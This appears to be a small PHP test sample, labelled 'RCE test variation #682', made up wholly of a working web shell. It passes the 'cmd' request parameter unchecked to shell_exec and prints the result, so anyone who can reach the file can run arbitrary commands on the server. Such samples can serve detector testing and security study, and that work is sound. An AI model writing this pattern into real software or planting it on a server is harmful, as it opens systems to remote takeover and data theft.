<?php
// RCE test variation #682
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>